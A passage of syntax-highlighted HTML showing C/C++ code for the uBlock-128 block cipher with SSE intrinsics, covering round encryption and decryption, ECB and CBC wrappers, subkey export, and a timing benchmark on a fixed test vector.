class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>);\t</span><br><span class=\"line\">\t__m128i c6 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">10</span>, <span class=\"number\">12</span>, <span class=\"number\">14</span>);\t\t</span><br><span class=\"line\">\t__m128i c7 = _mm_setr_epi8(<span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>, <span class=\"number\">7</span>, <span class=\"number\">9</span>, <span class=\"number\">11</span>, <span class=\"number\">13</span>, <span class=\"number\">15</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>);\t\t</span><br><span class=\"line\">\t__m128i c8 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>, <span class=\"number\">7</span>, <span class=\"number\">9</span>, <span class=\"number\">11</span>, <span class=\"number\">13</span>, <span class=\"number\">15</span>);\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i state1, state2, k, t1, t2, t3, t4;  </span><br><span class=\"line\"></span><br><span class=\"line\">\tstate2 = _mm_loadu_si128((__m128i*)plain);</span><br><span class=\"line\">\tstate1 = _mm_srli_epi16(state2, <span class=\"number\">4</span>);</span><br><span class=\"line\">\tstate1 = _mm_and_si128(state1, con);</span><br><span class=\"line\">\tstate2 = _mm_and_si128(state2, con);</span><br><span class=\"line\">\tt1 = _mm_shuffle_epi8(state1, c1);</span><br><span class=\"line\">\tt2 = _mm_shuffle_epi8(state2, c2);</span><br><span class=\"line\">\tt3 = _mm_shuffle_epi8(state1, c3);</span><br><span class=\"line\">\tt4 = _mm_shuffle_epi8(state2, c4);</span><br><span class=\"line\">\tstate1 = _mm_xor_si128(t1, t2);</span><br><span class=\"line\">\tstate2 = _mm_xor_si128(t3, t4);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; round; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tk = _mm_loadu_si128((__m128i*)Subkey[i]);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, k);</span><br><span class=\"line\">\t\tk = _mm_loadu_si128((__m128i*)(Subkey[i] + <span class=\"number\">16</span>));</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tstate1 = _mm_shuffle_epi8(S, state1);</span><br><span class=\"line\">\t\tstate2 = _mm_shuffle_epi8(S, state2);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, state1);</span><br><span class=\"line\">\t\tk = _mm_shuffle_epi8(state2, A1);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, k);</span><br><span class=\"line\">\t\tk = _mm_shuffle_epi8(state1, A2);</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\">\t\tk = _mm_shuffle_epi8(state2, A2);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, k);</span><br><span class=\"line\">\t\tk = _mm_shuffle_epi8(state1, A3);</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, state2);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tstate1 = _mm_shuffle_epi8(state1, L1);</span><br><span class=\"line\">\t\tstate2 = _mm_shuffle_epi8(state2, L2);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(round == <span class=\"number\">16</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tk = _mm_loadu_si128((__m128i*)Subkey[round]);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, k);</span><br><span class=\"line\">\t\tk = _mm_loadu_si128((__m128i*)(Subkey[round] + <span class=\"number\">16</span>));</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tt1 = _mm_shuffle_epi8(state1, c5);</span><br><span class=\"line\">\tt2 = _mm_shuffle_epi8(state2, c6);</span><br><span class=\"line\">\tt3 = _mm_shuffle_epi8(state1, c7);</span><br><span class=\"line\">\tt4 = _mm_shuffle_epi8(state2, c8);</span><br><span class=\"line\"></span><br><span class=\"line\">\tstate1 = _mm_xor_si128(t1, t2);</span><br><span class=\"line\">\tstate2 = _mm_xor_si128(t3, t4);</span><br><span class=\"line\"></span><br><span class=\"line\">\tstate1 = _mm_slli_epi16(state1, <span class=\"number\">4</span>);</span><br><span class=\"line\">\tstate1 = _mm_xor_si128(state1, state2);</span><br><span class=\"line\"></span><br><span class=\"line\">\t_mm_storeu_si128((__m128i*)cipher, state1);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">uBlock_128_Decrypt</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *cipher, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *plain, <span class=\"type\">int</span> round)</span><span class=\"comment\">// uBlock解密函数</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> i;</span><br><span class=\"line\">\t__m128i L1 = _mm_setr_epi8(<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">14</span>,<span class=\"number\">15</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>);\t\t</span><br><span class=\"line\">\t__m128i L2 = _mm_setr_epi8(<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">14</span>,<span class=\"number\">15</span>,<span class=\"number\">12</span>,<span class=\"number\">13</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">10</span>,<span class=\"number\">11</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>);\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i c1 = _mm_setr_epi8(<span class=\"number\">0</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">0x80</span>, <span class=\"number\">2</span>, <span class=\"number\">0x80</span>, <span class=\"number\">3</span>, <span class=\"number\">0x80</span>, <span class=\"number\">4</span>, <span class=\"number\">0x80</span>, <span class=\"number\">5</span>, <span class=\"number\">0x80</span>, <span class=\"number\">6</span>, <span class=\"number\">0x80</span>, <span class=\"number\">7</span>, <span class=\"number\">0x80</span>);\t</span><br><span class=\"line\">\t__m128i c2 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">0x80</span>, <span class=\"number\">2</span>, <span class=\"number\">0x80</span>, <span class=\"number\">3</span>, <span class=\"number\">0x80</span>, <span class=\"number\">4</span>, <span class=\"number\">0x80</span>, <span class=\"number\">5</span>, <span class=\"number\">0x80</span>, <span class=\"number\">6</span>, <span class=\"number\">0x80</span>, <span class=\"number\">7</span>);\t\t</span><br><span class=\"line\">\t__m128i c3 = _mm_setr_epi8(<span class=\"number\">8</span>, <span class=\"number\">0x80</span>, <span class=\"number\">9</span>, <span class=\"number\">0x80</span>, <span class=\"number\">10</span>, <span class=\"number\">0x80</span>, <span class=\"number\">11</span>, <span class=\"number\">0x80</span>, <span class=\"number\">12</span>, <span class=\"number\">0x80</span>, <span class=\"number\">13</span>, <span class=\"number\">0x80</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">15</span>, <span class=\"number\">0x80</span>);\t\t</span><br><span class=\"line\">\t__m128i c4 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">8</span>, <span class=\"number\">0x80</span>, <span class=\"number\">9</span>, <span class=\"number\">0x80</span>, <span class=\"number\">10</span>, <span class=\"number\">0x80</span>, <span class=\"number\">11</span>, <span class=\"number\">0x80</span>, <span class=\"number\">12</span>, <span class=\"number\">0x80</span>, <span class=\"number\">13</span>, <span class=\"number\">0x80</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">15</span>);\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i c5 = _mm_setr_epi8(<span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">10</span>, <span class=\"number\">12</span>, <span class=\"number\">14</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>);\t</span><br><span class=\"line\">\t__m128i c6 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">10</span>, <span class=\"number\">12</span>, <span class=\"number\">14</span>);\t\t</span><br><span class=\"line\">\t__m128i c7 = _mm_setr_epi8(<span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>, <span class=\"number\">7</span>, <span class=\"number\">9</span>, <span class=\"number\">11</span>, <span class=\"number\">13</span>, <span class=\"number\">15</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>);\t\t</span><br><span class=\"line\">\t__m128i c8 = _mm_setr_epi8(<span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">0x80</span>, <span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>, <span class=\"number\">7</span>, <span class=\"number\">9</span>, <span class=\"number\">11</span>, <span class=\"number\">13</span>, <span class=\"number\">15</span>);\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t__m128i state1, state2, k, t1, t2, t3, t4;  </span><br><span class=\"line\"></span><br><span class=\"line\">\tstate2 = _mm_loadu_si128((__m128i*)cipher);</span><br><span class=\"line\">\tstate1 = _mm_srli_epi16(state2, <span class=\"number\">4</span>);</span><br><span class=\"line\">\tstate1 = _mm_and_si128(state1, con);</span><br><span class=\"line\">\tstate2 = _mm_and_si128(state2, con);</span><br><span class=\"line\">\tt1 = _mm_shuffle_epi8(state1, c1);</span><br><span class=\"line\">\tt2 = _mm_shuffle_epi8(state2, c2);</span><br><span class=\"line\">\tt3 = _mm_shuffle_epi8(state1, c3);</span><br><span class=\"line\">\tt4 = _mm_shuffle_epi8(state2, c4);</span><br><span class=\"line\">\tstate1 = _mm_xor_si128(t1, t2);</span><br><span class=\"line\">\tstate2 = _mm_xor_si128(t3, t4);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i = round; i &gt; <span class=\"number\">0</span>; i--)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tk = _mm_loadu_si128((__m128i*)Subkey[i]);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, k);</span><br><span class=\"line\">\t\tk = _mm_loadu_si128((__m128i*)(Subkey[i] + <span class=\"number\">16</span>));</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tstate1 = _mm_shuffle_epi8(state1, L1);</span><br><span class=\"line\">\t\tstate2 = _mm_shuffle_epi8(state2, L2);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, state2);</span><br><span class=\"line\">\t\tk = _mm_shuffle_epi8(state1, A3);</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\">\t\tk = _mm_shuffle_epi8(state2, A2);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, k);</span><br><span class=\"line\">\t\tk = _mm_shuffle_epi8(state1, A2);</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\">\t\tk = _mm_shuffle_epi8(state2, A1);</span><br><span class=\"line\">\t\tstate1 = _mm_xor_si128(state1, k);</span><br><span class=\"line\">\t\tstate2 = _mm_xor_si128(state2, state1);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tstate1 = _mm_shuffle_epi8(S_Inv, state1);</span><br><span class=\"line\">\t\tstate2 = _mm_shuffle_epi8(S_Inv, state2);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tk = _mm_loadu_si128((__m128i*)Subkey[<span class=\"number\">0</span>]);</span><br><span class=\"line\">\tstate1 = _mm_xor_si128(state1, k);</span><br><span class=\"line\">\tk = _mm_loadu_si128((__m128i*)(Subkey[<span class=\"number\">0</span>] + <span class=\"number\">16</span>));</span><br><span class=\"line\">\tstate2 = _mm_xor_si128(state2, k);</span><br><span class=\"line\"></span><br><span class=\"line\">\tt1 = _mm_shuffle_epi8(state1, c5);</span><br><span class=\"line\">\tt2 = _mm_shuffle_epi8(state2, c6);</span><br><span class=\"line\">\tt3 = _mm_shuffle_epi8(state1, c7);</span><br><span class=\"line\">\tt4 = _mm_shuffle_epi8(state2, c8);</span><br><span class=\"line\"></span><br><span class=\"line\">\tstate1 = _mm_xor_si128(t1, t2);</span><br><span class=\"line\">\tstate2 = _mm_xor_si128(t3, t4);</span><br><span class=\"line\"></span><br><span class=\"line\">\tstate1 = _mm_slli_epi16(state1, <span class=\"number\">4</span>);</span><br><span class=\"line\">\tstate1 = _mm_xor_si128(state1, state2);</span><br><span class=\"line\"></span><br><span class=\"line\">\t_mm_storeu_si128((__m128i*)plain, state1);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Crypt_Enc_Block</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *input, <span class=\"type\">int</span> in_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *output, <span class=\"type\">int</span> *out_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *key, <span class=\"type\">int</span> keylen)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> g;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"built_in\">uBlock_128_KeySchedule</span>(key);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (g = <span class=\"number\">0</span>; g &lt; in_len / <span class=\"number\">16</span>; g++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">uBlock_128_Encrypt</span>(input+g*<span class=\"number\">16</span>, output+g*<span class=\"number\">16</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*out_len = in_len - in_len % <span class=\"number\">16</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Crypt_Dec_Block</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *input,<span class=\"type\">int</span> in_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *output,<span class=\"type\">int</span> *out_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *key, <span class=\"type\">int</span> keylen)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> g;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"built_in\">uBlock_128_KeySchedule</span>(key);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (g = <span class=\"number\">0</span>; g &lt; in_len / <span class=\"number\">16</span>; g++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">uBlock_128_Decrypt</span>(input+g*<span class=\"number\">16</span>, output+g*<span class=\"number\">16</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*out_len = in_len - in_len % <span class=\"number\">16</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Crypt_Enc_Block_Round</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *input, <span class=\"type\">int</span> in_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *output, <span class=\"type\">int</span> *out_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *key, <span class=\"type\">int</span> keylen, <span class=\"type\">int</span> cryptround)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> g;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"built_in\">uBlock_128_KeySchedule</span>(key);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (g = <span class=\"number\">0</span>; g &lt; in_len / <span class=\"number\">16</span>; g++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">uBlock_128_Encrypt</span>(input+g*<span class=\"number\">16</span>, output+g*<span class=\"number\">16</span>, cryptround);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*out_len = in_len - in_len % <span class=\"number\">16</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Key_Schedule</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *seedkey, <span class=\"type\">int</span> keylen, <span class=\"type\">int</span> direction, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *subkey)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">   <span class=\"type\">int</span> i, j;</span><br><span class=\"line\">   </span><br><span class=\"line\">   <span class=\"built_in\">uBlock_128_KeySchedule</span>(seedkey);</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">if</span>(direction == <span class=\"number\">0</span>)</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">\t   <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">17</span>; i++)</span><br><span class=\"line\">\t   &#123;</span><br><span class=\"line\">\t\t   <span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">16</span>; j++)</span><br><span class=\"line\">\t\t   &#123;</span><br><span class=\"line\">\t\t\t   subkey[i * <span class=\"number\">16</span> + j] = (Subkey[i][<span class=\"number\">2</span> * j] &lt;&lt; <span class=\"number\">4</span>) ^ Subkey[i][<span class=\"number\">2</span> * j + <span class=\"number\">1</span>];</span><br><span class=\"line\">\t\t   &#125;</span><br><span class=\"line\">\t   &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">if</span>(direction == <span class=\"number\">1</span>)</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">\t   <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">17</span>; i++)</span><br><span class=\"line\">\t   &#123;</span><br><span class=\"line\">\t\t   <span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">16</span>; j++)</span><br><span class=\"line\">\t\t   &#123;</span><br><span class=\"line\">\t\t\t   subkey[i * <span class=\"number\">16</span> + j] = (Subkey[<span class=\"number\">16</span> - i][<span class=\"number\">2</span> * j] &lt;&lt; <span class=\"number\">4</span>) ^ Subkey[<span class=\"number\">16</span> - i][<span class=\"number\">2</span> * j + <span class=\"number\">1</span>];</span><br><span class=\"line\">\t\t   &#125;</span><br><span class=\"line\">\t   &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Crypt_Enc_Block_CBC</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *input, <span class=\"type\">int</span> in_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *output, <span class=\"type\">int</span> *out_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *key, <span class=\"type\">int</span> keylen)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> g, j;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">char</span> iv[<span class=\"number\">16</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"built_in\">uBlock_128_KeySchedule</span>(key);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (g = <span class=\"number\">0</span>; g &lt; in_len / <span class=\"number\">16</span>; g++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">16</span>; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tiv[j] ^= input[g * <span class=\"number\">16</span> + j];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"built_in\">uBlock_128_Encrypt</span>(iv, output+g*<span class=\"number\">16</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">memcpy</span>(iv, output+g*<span class=\"number\">16</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*out_len = in_len - in_len % <span class=\"number\">16</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">Crypt_Dec_Block_CBC</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">char</span> *input,<span class=\"type\">int</span> in_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *output,<span class=\"type\">int</span> *out_len, <span class=\"type\">unsigned</span> <span class=\"type\">char</span> *key, <span class=\"type\">int</span> keylen)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> g, j;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">char</span> iv[<span class=\"number\">16</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"built_in\">uBlock_128_KeySchedule</span>(key);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (g = <span class=\"number\">0</span>; g &lt; in_len / <span class=\"number\">16</span>; g++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">uBlock_128_Decrypt</span>(input+g*<span class=\"number\">16</span>, output+g*<span class=\"number\">16</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(j = <span class=\"number\">0</span>; j &lt; <span class=\"number\">16</span>; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\toutput[g * <span class=\"number\">16</span> + j] ^= iv[j];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"built_in\">memcpy</span>(iv, input+g*<span class=\"number\">16</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*out_len = in_len - in_len % <span class=\"number\">16</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t    <span class=\"keyword\">auto</span> start = std::chrono::high_resolution_clock::<span class=\"built_in\">now</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">int</span> i, j, r;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">char</span> key[<span class=\"number\">16</span>]   = &#123;<span class=\"number\">0x01</span>,<span class=\"number\">0x23</span>,<span class=\"number\">0x45</span>,<span class=\"number\">0x67</span>,<span class=\"number\">0x89</span>,<span class=\"number\">0xAB</span>,<span class=\"number\">0xCD</span>,<span class=\"number\">0xEF</span>,<span class=\"number\">0xFE</span>,<span class=\"number\">0xDC</span>,<span class=\"number\">0xBA</span>,<span class=\"number\">0x98</span>,<span class=\"number\">0x76</span>,<span class=\"number\">0x54</span>,<span class=\"number\">0x32</span>,<span class=\"number\">0x10</span>&#125;;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">char</span> plain[<span class=\"number\">16</span>]   = &#123;<span class=\"number\">0x01</span>,<span class=\"number\">0x23</span>,<span class=\"number\">0x45</span>,<span class=\"number\">0x67</span>,<span class=\"number\">0x89</span>,<span class=\"number\">0xAB</span>,<span class=\"number\">0xCD</span>,<span class=\"number\">0xEF</span>,<span class=\"number\">0xFE</span>,<span class=\"number\">0xDC</span>,<span class=\"number\">0xBA</span>,<span class=\"number\">0x98</span>,<span class=\"number\">0x76</span>,<span class=\"number\">0x54</span>,<span class=\"number\">0x32</span>,<span class=\"number\">0x10</span>&#125;;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">char</span> cipher[<span class=\"number\">16</span>], subkey[<span class=\"number\">272</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(r = <span class=\"number\">0</span>; r &lt; <span class=\"number\">1000000</span>; r++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">Crypt_Enc_Block</span>(plain, <span class=\"number\">16</span>, cipher, &amp;j, key, <span class=\"number\">16</span>);\t</span><br><span class=\"line\">\t\t<span class=\"built_in\">memcpy</span>(plain, cipher, <span class=\"number\">16</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">16</span>; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%02x &quot;</span>, cipher[i]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">auto</span> end = std::chrono::high_resolution_clock::<span class=\"built_in\">now</span>();</span><br><span class=\"line\">    <span class=\"keyword\">auto</span> duration = std::chrono::<span class=\"built_in\">duration_cast</span>&lt;std::chrono::milliseconds&gt;(end - start);</span><br><span class=\"line\">    std::cout &lt;&lt; <span class=\"string\">&quot;Execution time: &quot;</span> &lt;&lt; duration.<span class=\"built_in\">count</span>() 